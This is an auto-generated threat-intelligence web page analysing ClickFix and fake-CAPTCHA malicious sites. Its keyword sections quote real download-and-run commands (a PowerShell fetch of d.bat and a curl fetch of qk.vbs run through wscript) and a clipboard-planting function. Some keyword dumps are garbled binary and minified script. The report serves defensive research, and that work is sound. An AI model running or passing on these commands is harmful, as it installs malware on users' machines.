@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Emerging ClickGrab Campaign: Advanced Analysis of 2026-05-12 Attack Patterns - ClickGrab Threat Intelligence</title>
+    <meta name="description" content="ClickGrab analyzes potential ClickFix and FakeCAPTCHA URLs from URLhaus">
+    <link rel="stylesheet" href="/ClickGrab/assets/css/styles.css">
+    <link rel="icon" href="/ClickGrab/assets/images/favicon.ico" type="image/x-icon">
+    <style>
+        .text-logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #0f766e;
+        }
+    </style>
+    
+<style>
+    /* Blog post specific styles */
+    .article-container {
+        max-width: 900px;
+        margin: 0 auto;
+        background: white;
+        border-radius: 12px;
+        box-shadow: var(--shadow-lg);
+        overflow: hidden;
+    }
+    
+    .article-header {
+        background: linear-gradient(135deg, #0e7490 0%, #0f766e 100%);
+        color: white;
+        padding: 3rem 2rem;
+        text-align: center;
+        position: relative;
+    }
+    
+    .article-header::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="20" cy="20" r="2" fill="rgba(255,255,255,0.1)"/><circle cx="80" cy="40" r="1.5" fill="rgba(255,255,255,0.1)"/><circle cx="40" cy="60" r="1" fill="rgba(255,255,255,0.1)"/><circle cx="70" cy="80" r="2.5" fill="rgba(255,255,255,0.1)"/></svg>') repeat;
+        pointer-events: none;
+    }
+    
+    .article-header .content {
+        position: relative;
+        z-index: 1;
+    }
+    
+    .article-title {
+        font-size: 2.5rem;
+        margin-bottom: 1rem;
+        line-height: 1.2;
+        border-bottom: none;
+        color: white;
+    }
+    
+    .article-meta {
+        display: flex;
+        justify-content: center;
+        gap: 2rem;
+        margin-top: 1.5rem;
+        flex-wrap: wrap;
+    }
+    .hero-metrics {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+        gap: 0.75rem;
+        margin-top: 1.25rem;
+    }
+    .hero-metric {
+        background: rgba(255,255,255,0.15);
+        border: 1px solid rgba(255,255,255,0.25);
+        color: white;
+        border-radius: 10px;
+        padding: 0.75rem 1rem;
+    }
+    .hero-metric .num { font-weight: 800; font-size: 1.4rem; display:block; }
+    .hero-metric .lbl { opacity: 0.95; font-size: 0.8rem; }
+    
+    .meta-item {
+        background: rgba(255,255,255,0.2);
+        padding: 0.5rem 1rem;
+        border-radius: 25px;
+        font-size: 0.9rem;
+    }
+    
+    .article-content {
+        padding: 3rem;
+        line-height: 1.8;
+    }
+
+    /* On this page (sticky) */
+    .toc-layout { display: grid; grid-template-columns: 1fr 260px; gap: 2rem; }
+    .toc-sidebar {
+        position: sticky; top: 100px; align-self: start; height: max-content;
+        background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px; padding: 1rem;
+    }
+    .toc-title { font-weight: 700; margin: 0 0 0.5rem 0; font-size: 0.95rem; color: #334155; }
+    .toc-list { list-style: none; margin: 0; padding: 0; }
+    .toc-list li { margin: 0.25rem 0; }
+    .toc-link { color: #64748b; text-decoration: none; font-size: 0.9rem; }
+    .toc-link.active { color: #4f46e5; font-weight: 600; }
+    
+    .article-content h2 {
+        color: var(--primary-color);
+        margin-top: 3rem;
+        margin-bottom: 1.5rem;
+        font-size: 1.8rem;
+        border-bottom: 2px solid var(--primary-color);
+        padding-bottom: 0.5rem;
+    }
+    
+    .article-content h3 {
+        color: var(--secondary-color);
+        margin-top: 2rem;
+        margin-bottom: 1rem;
+        font-size: 1.4rem;
+    }
+    
+    .article-content h4 {
+        color: var(--text-color);
+        margin-top: 1.5rem;
+        margin-bottom: 0.75rem;
+        font-size: 1.2rem;
+    }
+    
+    .article-content p {
+        margin-bottom: 1.5rem;
+        color: var(--text-color);
+    }
+    
+    .article-content ul, .article-content ol {
+        margin-bottom: 1.5rem;
+        padding-left: 2rem;
+    }
+    
+    .article-content li {
+        margin-bottom: 0.5rem;
+        color: var(--text-color);
+    }
+    
+    .article-content table {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 2rem 0;
+        background: #f8fafc;
+        border-radius: 8px;
+        overflow: hidden;
+    }
+    
+    .article-content th,
+    .article-content td {
+        padding: 1rem;
+        text-align: left;
+        border-bottom: 1px solid #e2e8f0;
+    }
+    
+    .article-content th {
+        background: var(--primary-color);
+        color: white;
+        font-weight: 600;
+    }
+    
+    .article-content tr:hover {
+        background: #f1f5f9;
+    }
+    
+    .article-content pre {
+        background: #1a202c;
+        color: #e2e8f0;
+        padding: 1.5rem;
+        border-radius: 8px;
+        overflow-x: auto;
+        margin: 1.5rem 0;
+        line-height: 1.6;
+    }
+    
+    .article-content code {
+        background: #f1f5f9;
+        color: #e53e3e;
+        padding: 0.25rem 0.5rem;
+        border-radius: 4px;
+        font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
+        font-size: 0.9em;
+    }
+    
+    .article-content pre code {
+        background: none;
+        color: inherit;
+        padding: 0;
+    }
+    
+    .highlight-box {
+        background: linear-gradient(135deg, #fff5f5 0%, #fed7d7 100%);
+        border-left: 4px solid #e53e3e;
+        padding: 1.5rem;
+        margin: 2rem 0;
+        border-radius: 0 8px 8px 0;
+    }
+    
+    .info-box {
+        background: linear-gradient(135deg, #ebf8ff 0%, #bee3f8 100%);
+        border-left: 4px solid var(--primary-color);
+        padding: 1.5rem;
+        margin: 2rem 0;
+        border-radius: 0 8px 8px 0;
+    }
+    
+    .stats-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 1.5rem;
+        margin: 2rem 0;
+    }
+    
+    .stat-item {
+        background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+        color: white;
+        padding: 1.5rem;
+        border-radius: 8px;
+        text-align: center;
+    }
+    
+    .stat-number {
+        font-size: 2rem;
+        font-weight: 700;
+        display: block;
+        margin-bottom: 0.5rem;
+    }
+    
+    .stat-label {
+        font-size: 0.9rem;
+        opacity: 0.9;
+    }
+    
+    .back-link {
+        display: inline-flex;
+        align-items: center;
+        gap: 0.5rem;
+        color: var(--primary-color);
+        text-decoration: none;
+        font-weight: 600;
+        margin-bottom: 2rem;
+        transition: all 0.3s ease;
+    }
+    
+    .back-link:hover {
+        transform: translateX(-5px);
+    }
+    
+    .article-footer {
+        background: #f8fafc;
+        padding: 2rem;
+        border-top: 1px solid #e2e8f0;
+        text-align: center;
+    }
+    
+    .share-buttons {
+        display: flex;
+        justify-content: center;
+        gap: 1rem;
+        margin-top: 1rem;
+    }
+    
+    .share-btn-footer {
+        background: var(--primary-color);
+        color: white;
+        padding: 0.75rem 1.5rem;
+        border-radius: 25px;
+        text-decoration: none;
+        font-weight: 600;
+        transition: all 0.3s ease;
+    }
+    
+    .share-btn-footer:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 25px rgba(37, 99, 235, 0.3);
+        color: white;
+    }
+    
+    @media (max-width: 768px) {
+        .article-content {
+            padding: 1.5rem;
+        }
+        
+        .article-title {
+            font-size: 1.8rem;
+        }
+        
+        .article-meta {
+            flex-direction: column;
+            gap: 1rem;
+        }
+        
+        .stats-grid {
+            grid-template-columns: 1fr;
+        }
+        .toc-layout { grid-template-columns: 1fr; }
+        .toc-sidebar { display: none; }
+    }
+</style>
+
+</head>
+<body>
+    <header class="site-header">
+        <div class="container">
+            <div class="logo">
+                <a href="/ClickGrab/">
+                    <img src="/ClickGrab/assets/images/logo.png" alt="ClickGrab" onerror="this.style.display='none';this.nextElementSibling.style.display='block';">
+                    <span class="text-logo" style="display:none;">CLICKGRAB</span>
+                </a>
+            </div>
+            <nav class="main-nav">
+                <ul>
+                    <li><a href="/ClickGrab/" class="">Home</a></li>
+                    <li><a href="/ClickGrab/analysis.html" class="active">Analysis</a></li>
+                    <li><a href="/ClickGrab/reports.html" class="">Reports</a></li>
+                    <li><a href="/ClickGrab/techniques.html" class="">Techniques</a></li>
+                <li><a href="/ClickGrab/mitigations.html" class="">Mitigations</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main class="site-content">
+        <div class="container">
+            
+<a href="/ClickGrab/analysis.html" class="back-link">← Back to Analysis</a>
+
+<article class="article-container">
+    <header class="article-header">
+        <div class="content">
+            <h1 class="article-title">Emerging ClickGrab Campaign: Advanced Analysis of 2026-05-12 Attack Patterns</h1>
+            <div class="article-meta">
+                <span class="meta-item">📅 Published: May 12, 2026</span>
+                <span class="meta-item">👨‍💻 Author: ClickGrab Threat Intelligence Team</span>
+                <span class="meta-item">📖 12 min read</span>
+            </div>
+            
+            <div class="hero-metrics">
+                
+                <div class="hero-metric"><span class="num">100</span><span class="lbl">Sites</span></div>
+                
+                
+                <div class="hero-metric"><span class="num">22%</span><span class="lbl">Detection</span></div>
+                
+                
+                <div class="hero-metric"><span class="num">2</span><span class="lbl">PS Downloads</span></div>
+                
+            </div>
+            
+        </div>
+    </header>
+
+    <div class="article-content toc-layout">
+        <div>
+            <h1>ClickGrab Threat Analysis Report - 2026-05-12</h1>
+<p><em>Generated on 2026-05-12 01:55:57</em></p>
+<h2>Executive Summary</h2>
+<ul>
+<li><strong>Total sites analyzed</strong>: 100</li>
+<li><strong>Sites with malicious content</strong>: 22</li>
+<li><strong>Unique domains encountered</strong>: 1,314</li>
+<li><strong>Total URLs extracted</strong>: 6,742</li>
+<li><strong>PowerShell download attempts</strong>: 2</li>
+<li><strong>Clipboard manipulation instances</strong>: 102</li>
+</ul>
+<h2>Domain Analysis</h2>
+<h3>Most Frequently Encountered Domains</h3>
+<ul>
+<li><strong>bharatnamkeens.com</strong>: 405 occurrences</li>
+<li><strong>www.maheshwaree.com</strong>: 320 occurrences</li>
+<li><strong>twitch.co.com</strong>: 318 occurrences</li>
+<li><strong>98.70.13.131</strong>: 309 occurrences</li>
+<li><strong>fudgeshop.com.au</strong>: 265 occurrences</li>
+<li><strong>picsera.com</strong>: 227 occurrences</li>
+<li><strong>18.176.47.246</strong>: 218 occurrences</li>
+<li><strong>adturekorea.co.kr</strong>: 214 occurrences</li>
+<li><strong>scillarodriguez.com</strong>: 198 occurrences</li>
+<li><strong>www.ccera-icar.org</strong>: 178 occurrences</li>
+<li><strong>www.evodigital.com.au</strong>: 156 occurrences</li>
+<li><strong>devblog.ezeelogin.com</strong>: 132 occurrences</li>
+<li><strong>www.dorper.com.au</strong>: 125 occurrences</li>
+<li><strong>picsera.sirv.com</strong>: 121 occurrences</li>
+<li><strong>104.199.248.167</strong>: 71 occurrences</li>
+</ul>
+<h2>URL Pattern Analysis</h2>
+<h3>reCAPTCHA imagery</h3>
+<p><em>11 occurrences across 8 distinct URLs</em></p>
+<ul>
+<li><code>https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png</code> (2 times)</li>
+<li><code>https://www.google.com/recaptcha/api.js</code> (2 times)</li>
+<li><code>https://2captcha.com/dist/web/assets/google-privacy-policy-Cb0CGVRT.svg</code> (2 times)</li>
+<li><code>https://pizzabyte.com.au/smartdetection/deviceverification/CF/path/captcha</code> (1 times)</li>
+<li><code>https://www.google.com/recaptcha/api.js?hl=&amp;render=6Lf7uxYsAAAAANagtTWlY2ET8HF8nbfMf4-ePcWm</code> (1 times)</li>
+<li><em>...and 3 more distinct URLs</em></li>
+</ul>
+<h3>Font resources</h3>
+<p><em>72 occurrences across 60 distinct URLs</em></p>
+<ul>
+<li><code>https://fonts.gstatic.com</code> (5 times)</li>
+<li><code>https://fonts.googleapis.com</code> (3 times)</li>
+<li><code>https://18.176.47.246/wp-content/plugins/vk-post-author-display/vendor/vektor-inc/font-awesome-versions/src/font-awesome/css/all.min.css?ver=7.1.0</code> (2 times)</li>
+<li><code>https://adturekorea.co.kr/js/font-awesome/css/font-awesome.min.css?ver=220620</code> (2 times)</li>
+<li><code>https://use.fontawesome.com/releases/v5.6.3/css/all.css</code> (2 times)</li>
+<li><em>...and 55 more distinct URLs</em></li>
+</ul>
+<h3>CDN hosted scripts</h3>
+<p><em>9 occurrences across 9 distinct URLs</em></p>
+<ul>
+<li><code>https://cdn.jsdelivr.net/npm/three@0.167.0/build/three.module.js</code> (1 times)</li>
+<li><code>https://cdn.jsdelivr.net/npm/three@0.167.0/examples/jsm/</code> (1 times)</li>
+<li><code>https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1</code> (1 times)</li>
+<li><code>https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css?ver=6.8.5</code> (1 times)</li>
+<li><code>https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js?ver=6.0.8</code> (1 times)</li>
+<li><em>...and 4 more distinct URLs</em></li>
+</ul>
+<h3>Google resources</h3>
+<p><em>116 occurrences across 63 distinct URLs</em></p>
+<ul>
+<li><code>https://bharatnamkeens.com/wp-content/plugins/widget-google-reviews/assets/img/guest.png</code> (32 times)</li>
+<li><code>https://www.google.com/s2/favicons?sz=128&amp;domain=${encodeURIComponent</code> (13 times)</li>
+<li><code>https://fonts.googleapis.com</code> (3 times)</li>
+<li><code>https://www.googletagmanager.com/gtm.js?id=</code> (3 times)</li>
+<li><code>https://www.google</code> (3 times)</li>
+<li><em>...and 58 more distinct URLs</em></li>
+</ul>
+<h2>Suspicious Keyword Analysis</h2>
+<p><strong>Total Keywords Found</strong>: 519 (107 unique)</p>
+<h3>Keyword Categories</h3>
+<h4>Social Engineering</h4>
+<p><em>42 unique keywords</em></p>
+<ul>
+<li><code>CAPTCHA-verificatie-ID</code></li>
+<li><code>verification_data</code></li>
+<li><code>captcha-js</code></li>
+<li><code>To better prove you are not a robot</code></li>
+<li><code>captcha-box</code></li>
+<li><code>verification-id</code></li>
+<li><code>exec /i https://i-like-ele-phants-verification.live/iamchallenge/verification/UserID7383526</code>;`</li>
+<li><code>Checking if you are human</code></li>
+<li><code>captcha_sid</code></li>
+<li><code>exec(bv_bg_style))!==null;){let new_img_url=getNewImageUrlSVG(new_url,bv_webp_status,property_value,entry2.target.getBoundingClientRect());bv_bg_style=bv_bg_style.replace(match[1],new_img_url)}let new_bv_bg_style=entry2.target.getAttribute("style")||"";new_bv_bg_style=new_bv_bg_style+(new_bv_bg_style?";":"")+(bv_bg_style||""),entry2.target.setAttribute("style",new_bv_bg_style)}else{for(;(match=regex.exec(property_value))!==null;){let new_img_url=getNewImageUrlSVG(new_url,bv_webp_status,property_value,entry2.target.getBoundingClientRect());property_value=property_value.replace(match[1],new_img_url)}entry2.target.style.setProperty(property_type,property_value,"important")}}}bvObservedNodesWithCounter.delete(entry2.target),other_image_observer.unobserve(entry2.target)}})}__name(handleOtherImages,"handleOtherImages");function handleIframesV2(entries){entries.map(entry2=&gt;{entry2.isIntersecting&amp;&amp;(set_iframe_element_src_v2(entry2.target),iframe_observer_v2.unobserve(entry2.target))})}__name(handleIframesV2,"handleIframesV2");const bvCheckNode=__name((node,currentLevel=1,maxLevel=1/0)=&gt;{if(node.nodeType===1){const className=node.getAttribute("class");if(node.nodeName==="IFRAME"&amp;&amp;typeof className=="string"&amp;&amp;className.includes("bv-lazyload-iframe"))iframe_observer_v2.observe(node);else{const computedStyle=getComputedStyle(node),background=computedStyle.getPropertyValue("background")||"none",backgroundImage=computedStyle.getPropertyValue("background-image")||"none";backgroundImage!=="none"&amp;&amp;backgroundImage.match(/url\(/)?(get_bv_identifier(backgroundImage,"bv-img-url")||get_bv_identifier(backgroundImage))&amp;&amp;bvObserveImgNode(node):background!=="none"&amp;&amp;background.match(/url\(/)?(get_bv_identifier(background,"bv-img-url")||get_bv_identifier(background))&amp;&amp;bvObserveImgNode(node):typeof className=="string"&amp;&amp;className.includes("bv-lazyload-bg-style")?bv_style_observer.observe(node):typeof className=="string"&amp;&amp;className.includes("bv-lazyload-tag-img")?img_observer.observe(node):typeof className=="string"&amp;&amp;className.includes("bv-lazyload-picture")&amp;&amp;picture_lazy_observer.observe(node)}}currentLevel&lt;maxLevel&amp;&amp;node.childNodes.length&amp;&amp;node.childNodes.forEach(childNode=&gt;{bvCheckNode(childNode,currentLevel+1,maxLevel)})},"bvCheckNode");function bv_handle_mutations(mutations){mutations.forEach(mutation=&gt;{if(mutation.type==="childList"&amp;&amp;mutation.addedNodes.length)mutation.addedNodes.forEach(node=&gt;{setTimeout(function(){bvCheckNode(node)},0)});else if(mutation.type==="attributes"){const targetNode=mutation.target,attributeName=mutation.attributeName,attributeValue=targetNode.getAttribute(attributeName);if(attributeName==="style"&amp;&amp;targetNode.style.backgroundImage!==mutation_observer.prevBackgroundImage){const computedStyle=getComputedStyle(targetNode),background=computedStyle.getPropertyValue("background")||"none",backgroundImage=computedStyle.getPropertyValue("background-image")||"none";backgroundImage!=="none"&amp;&amp;backgroundImage.match(/url\(/)?(get_bv_identifier(backgroundImage,"bv-img-url")||get_bv_identifier(backgroundImage))&amp;&amp;bvObserveImgNode(targetNode):background!=="none"&amp;&amp;background.match(/url\(/)&amp;&amp;(get_bv_identifier(background,"bv-img-url")||get_bv_identifier(background))&amp;&amp;bvObserveImgNode(targetNode)}else attributeName==="class"&amp;&amp;setTimeout(function(){bvCheckNode(targetNode)},0)}})}__name(bv_handle_mutations,"bv_handle_mutations");function handle_mod_key_nodes(){let node_elements=document.querySelectorAll("[bv-img-mod-key]");for(let i=0;i&lt;node_elements.length;i++){let element=node_elements[i],target_key=element.getAttribute("bv-img-mod-key"),mod_url=element.getAttribute(target_key);if(mod_url){let bv_img_url=get_bv_identifier(mod_url,"bv-img-url"),url_identifier=get_bv_identifier(mod_url),old_url=bv_img_url||(url_identifier?bv_url_map[url_identifier]:null);if(old_url){let dimensions=element.getBoundingClientRect(),new_img_url=getNewImageUrlSVG(old_url,bv_webp_status,mod_url,dimensions);element.setAttribute(target_key,new_img_url)}}}}__name(handle_mod_key_nodes,"handle_mod_key_nodes");function bvRemoveEventListeners(){for(const event of bv_lazyload_events)window.removeEventListener(event,handleLazyloadedStyleImages)}__name(bvRemoveEventListeners,"bvRemoveEventListeners");function handleLazyloadedStyleImages(){setTimeout(function(){bvRemoveEventListeners()},0),document.querySelectorAll("body *").forEach(_element=&gt;{setTimeout(function(){bvCheckNode(_element,1,1)},0)})}__name(handleLazyloadedStyleImages,"handleLazyloadedStyleImages"),handle_mod_key_nodes();let other_image_observer,iframe_observer_v2,mutation_observer;var bvDynamicImageObserverOptions={rootMargin:"200px 0px",threshold:.01};"IntersectionObserver"in window&amp;&amp;(other_image_observer=new IntersectionObserver(handleOtherImages,bvDynamicImageObserverOptions),iframe_observer_v2=new IntersectionObserver(handleIframesV2,bvDynamicImageObserverOptions)),"MutationObserver"in window&amp;&amp;(mutation_observer=new MutationObserver(bv_handle_mutations),mutation_observer.prevBackground="",mutation_observer.prevBackgroundImage="",mutation_observer.observe(document.body,{childList:!0,subtree:!0,attributes:!0,characterData:!0})),"IntersectionObserver"in window&amp;&amp;"MutationObserver"in window&amp;&amp;window.addEventListener("load",event=&gt;{for(const event2 of bv_lazyload_events)window.addEventListener(event2,handleLazyloadedStyleImages,{once:!0})})</code></li>
+<li><em>...and 32 more</em></li>
+</ul>
+<h4>Obfuscation Indicators</h4>
+<p><em>11 unique keywords</em></p>
+<ul>
+<li><code>eval("clearTimeout(timeIn"+uid+")")</code></li>
+<li><code>eval("clearTimeout(timeOut"+uid+")")</code></li>
+<li><code>eval("timeOut"+uid+" = setTimeout(function(){ li.find('&gt; .catalog-section-childs').hide(15); }, 200);")</code></li>
+<li><code>eval('var timeOut'+popupItems[i].id)</code></li>
+<li><code>eval("timeIn"+uid+" = setTimeout(function(){ li.find('&gt; .catalog-section-childs').show(15).css({'top': top + 'px', 'left': left + 'px'}); }, 200);")</code></li>
+<li><code>eval(frameContents)</code></li>
+<li><code>exec() QApplication::%s: Please instantiate the QApplication object first  %L1 WARNING: QApplication was not created in the main() thread. �sgqAppName        QCoreApplication: Application event filter cannot be in a different thread.     QCoreApplication: Object event filter cannot be in a different thread.  QCoreApplication::applicationFilePath: Please instantiate the QApplication object first QCoreApplication::argc: Please instantiate the QApplication object first        QCoreApplication::argv: Please instantiate the QApplication object first        QCoreApplication::enter_loop: Must be called from the main thread   enter_loop  loopLevel   QCoreApplication::notify: Unexpected null receiver  installTranslator       QCoreApplication::applicationDirPath: Please instantiate the QApplication object first  removeTranslator    QCoreApplication::postEvent: Unexpected null receiver       QCoreApplication::sendPostedEvents: Cannot send posted events for objects in another thread     QCoreApplication::exit_loop: Must be called from the main thread    exit_loop   &lt;�g��g��g��gP-g�g�    g��g��g��g��g��g g� g��
+g-testability    -graphicssystem -session    -style  -style= -widgetcount    -stylesheet -reverse    -qdebug -qdevel QCoreApplication::arguments: Please instantiate the QApplication object first   QT_PLUGIN_PATH  QCoreApplication::exec: The event loop is already running   %s::exec: Must be called from the main thread   exec    ��g�3g��g�3g �g4gl�g�4g::  const   enum    class   struct   char    short  ulong    long   uint     int    unsigned    const   onst    Qt  void    QMetaMethod::invoke: Dead lock detected in BlockingQueuedConnection: Receiver is %s(%p)</code></li>
+<li><code>eval(script)</code></li>
+<li><code>eval(</code></li>
+<li><code>eval(this._loadScript(url.url) + "\n//@ sourceURL= " + url.url)</code></li>
+<li><em>...and 1 more</em></li>
+</ul>
+<h4>System Commands</h4>
+<p><em>33 unique keywords</em></p>
+<ul>
+<li><code>exec(this.url)</code></li>
+<li><code>command %d  QPicture::metric: Invalid metric command    ffffff9@QPicture::play: Format error    /pictureformats QPictureIO::write: No such picture format handler: %s   QPicture: invalid format version 0  0�be@�e�� e��e��e �Fe�ep�eQPicture::load: No such picture format: %s  QPicture::save: No such picture format: %s      QPicture::save: still being painted on. Call QPainter::end() first  ��be��e��Oe��=e��=e��Oe|�beЍNe �Ne��Ne@�e�{Oed{Oej{Oep{Oev{Oe|{Oe�{Oe     �be</code>�e@le�lePze�ze�e�xe�oe�me�re�se�
+e�pene�e@oee@ne ne�oe�oe��eQPixmap: Must construct a QApplication before a QPaintDevice    L�be��ep�2e0�e��e �Fe�eQPixmap::operator=: Cannot assign to pixmap during painting QPixmap::save: quality out of range [-1,100]    QPixmap::setMask() mask size differs from pixmap size       QPixmap::setMask: Cannot set mask while pixmap is being painted on  QPixmap::fill: Cannot fill while pixmap is being painted on QPixmap::setAlphaChannel: The pixmap and the alpha channel pixmap must have the same size       QPixmap::setAlphaChannel: Cannot set alpha channel while pixmap is being painted on QPixmap::scaled: Pixmap is a null pixmap    QPixmap::scaleWidth: Pixmap is a null pixmap    QPixmap::scaleHeight: Pixmap is a null pixmap   qt_pixmap                                                              QPMCache    QCache<QPixmapCache::Key,QPixmapCacheEntry> <code>�be��ep�2e0�e��e �Fe�e��be@�e��e��Ne��e�{Oed{Oe��ep{Oev{Oe|{Oe�{Oe @�    �            ��            ���            ��      @P�be��Fe��beЏNe��Ne��Ne��Oe�{Oed{Oej{Oep{Oev{Oe|{Oe�{Oe0TNe��Oe��be�e@�be��Fe      @��be��Fe��be��Fe       @&lt;�be��Ne@�Ne��Nepe�{Oed{Oej{Oep{Oev{Oe|{Oe�{Oe!e0)e      �@��be��Ne��Ne��Nepe�{Oed{Oej{Oep{Oev{Oe|{Oe�{Oe�.e0@e��be �Ne�Ne��Ne�e�{Oed{Oej{Oep{Oev{Oe|{Oe�{Oe0TNe�0e,�be�Nep�Ne��Nepe�{Oed{Oej{Oep{Oev{Oe|{Oe�{Oe�6epCe�?�h㈵��&gt;      @��be�Ie��Oe��Oe|�be@�Ne��Ne��NeIe�{Oed{Oej{Oep{Oev{Oe|{Oe�{Oep�be Je��Oe��Oe �beP�Ne��Ne��Ne�Ie�{Oed{Oej{Oep{Oev{Oe|{Oe�{Oe               
+         O      U                                                +   &amp;            @   :            g   a            �               �   �            �            </code></li>
+<li><code>wscript</code></li>
+<li><code>command =</code>powershell -c "Invoke-WebRequest -Uri 'http://95.164.53.214:5554/d.bat' -OutFile \"%temp%\d.bat\" -UseBasicParsing; Start-Process \"%temp%\d.bat\""<code>;</code></li>
+<li><code>powershell</code></li>
+<li><code>exec /i http://inkbookwriters.com/verify';</code></li>
+<li><code>Invoke</code></li>
+<li><code>const command =</code></li>
+<li>`exec(ua) != null)
+{
+rv = parseFloat(RegExp.$1);
+}
+}
+else if (n.appName == "Netscape")
+{
+rv = 11;
+re = new RegExp("Trident/.<em>rv:([0-9]+[.0-9]</em>)");
+if (re.exec(ua) != null)
+{
+rv = parseFloat(RegExp.$1);
+}
+}
+}</li>
+</ul>
+<p>return rv;
+}</p>
+<p>})(window, document, navigator)<code>-</code>Invoke-WebRequest`
+- <em>...and 23 more</em></p>
+<h4>Verification Text</h4>
+<p><em>3 unique keywords</em></p>
+<ul>
+<li><code>hidden</code></li>
+<li><code>ray id</code></li>
+<li><code>Hidden</code></li>
+</ul>
+<h4>Technical Terms</h4>
+<p><em>18 unique keywords</em></p>
+<ul>
+<li><code>CreateThread</code></li>
+<li><code>odyssey</code></li>
+<li><code>You will observe</code></li>
+<li><code>WinHttpRequest</code></li>
+<li><code>VirtualAlloc</code></li>
+<li><code>.ps1</code></li>
+<li><code>Ray ID</code></li>
+<li><code>iex</code></li>
+<li><code>bitmap</code></li>
+<li><code>responseText</code></li>
+<li><em>...and 8 more</em></li>
+</ul>
+<h3>Most Frequent Keywords</h3>
+<ul>
+<li><strong>hidden</strong>: 45 occurrences</li>
+<li><strong>robot</strong>: 38 occurrences</li>
+<li><strong>Robot</strong>: 28 occurrences</li>
+<li><strong>failed_to_retrieve</strong>: 21 occurrences</li>
+<li><strong>verification</strong>: 20 occurrences</li>
+<li><strong>CAPTCHA</strong>: 18 occurrences</li>
+<li><strong>Verification</strong>: 17 occurrences</li>
+<li><strong>CAPTCHA Verification</strong>: 16 occurrences</li>
+<li><strong>I am not a robot</strong>: 16 occurrences</li>
+<li><strong>You will observe</strong>: 16 occurrences</li>
+<li><strong>verification-id</strong>: 16 occurrences</li>
+<li><strong>To better prove you are not a robot</strong>: 16 occurrences</li>
+<li><strong>Verification ID</strong>: 15 occurrences</li>
+<li><strong>Ray ID</strong>: 14 occurrences</li>
+<li><strong>Checking if you are human</strong>: 14 occurrences</li>
+</ul>
+<h3>Similar Keyword Patterns</h3>
+<p><em>Groups of keywords that appear to be variations of the same theme:</em></p>
+<p><strong>Group 1</strong>: <code>cmd /c "curl -s http://178.17.59.40:5506/qk.vbs -o %temp%\\qk.vbs &gt;nul &amp;&amp; wscript.exe //B //E:VBScript %temp%\\qk.vbs"';</code>, <code>command = 'cmd /c "curl -s http://178.17.59.40:5506/qk.vbs -o %temp%\\qk.vbs &gt;nul &amp;&amp; wscript.exe //B //E:VBScript %temp%\\qk.vbs"';</code></p>
+<p><strong>Group 2</strong>: <code>CAPTCHA Verification</code>, <code>CAPTCHA-verificatie-ID</code>, <code>Verification</code>, <code>verification</code></p>
+<p><strong>Group 3</strong>: <code>Verification ID</code>, <code>verification-id</code>, <code>verification_data</code>, <code>verification id</code>, <code>Verification Hash</code>, <code>verification_id</code></p>
+<p><strong>Group 4</strong>: <code>Ray ID</code>, <code>ray id</code></p>
+<p><strong>Group 5</strong>: <code>CAPTCHA</code>, <code>captcha</code>, <code>captcha-badge</code>, <code>captcha-logo</code>, <code>CAPTCHA-logo</code>, <code>captcha-box</code>, <code>captcha_word</code>, <code>captcha_sid</code>, <code>captcha-js</code>, <code>Captcha</code></p>
+<h2>JavaScript Obfuscation Analysis</h2>
+<p><strong>Obfuscation Sophistication Score</strong>: 0/7</p>
+<h3>Potential Base64 Encoded Content</h3>
+<p><em>These strings may contain encoded malicious payloads:</em></p>
+<ul>
+<li><code>caRemoveVRoots1ISCHECKFORPRODUCTUPDATESAllUsersApp...</code></li>
+<li><code>QSocks5SocketEnginePrivate</code></li>
+<li><code>USERNAMEARInstallChoiceCreating</code></li>
+<li><code>au/smartdetection/deviceverification/CF/path/captc...</code></li>
+<li><code>controlSocketBytesWritten</code></li>
+</ul>
+<h2>Clipboard Manipulation Analysis</h2>
+<p>Detected clipboard manipulation in <strong>102</strong> instances.</p>
+<h3>Document.Execcommand Copy</h3>
+<p>Found in <strong>42</strong> snippets (41.2% of clipboard code)</p>
+<p><strong>Examples:</strong></p>
+<pre><code class="language-javascript">try { document.execCommand('copy')
+</code></pre>
+<pre><code class="language-javascript">document.execCommand(&quot;copy&quot;)
+</code></pre>
+<pre><code class="language-javascript">document.execCommand('copy')
+</code></pre>
+<h3>Textarea Manipulation</h3>
+<p>Found in <strong>45</strong> snippets (44.1% of clipboard code)</p>
+<p><strong>Examples:</strong></p>
+<pre><code class="language-javascript">ipboardCopyData(textToCopy){ const tempTextArea = document.createElement(&quot;textarea&quot;
+</code></pre>
+<pre><code class="language-javascript">tListener(&quot;click&quot;, function () { const textarea = document.createElement('textarea'
+</code></pre>
+<pre><code class="language-javascript">ng is the safe placeholder above const textarea = document.createElement('textarea'
+</code></pre>
+<h3>Complete Malicious Functions</h3>
+<p><strong>Function 1:</strong></p>
+<pre><code class="language-javascript">function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement(&quot;textarea&quot;); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand(&quot;copy&quot;); document.body.removeChild(tempTextArea); }
+</code></pre>
+<hr />
+<p><em>Report truncated for storage. Full per-site detail is available in the scan JSON under nightly_reports/.</em></p>
+        </div>
+        <aside class="toc-sidebar" id="toc"></aside>
+    </div>
+
+    <footer class="article-footer">
+        <p>📊 <strong>Analysis conducted by the ClickGrab Threat Intelligence Team</strong></p>
+        <p>For questions about this analysis or to report similar threats, contact us on GitHub.</p>
+        
+        <div class="share-buttons">
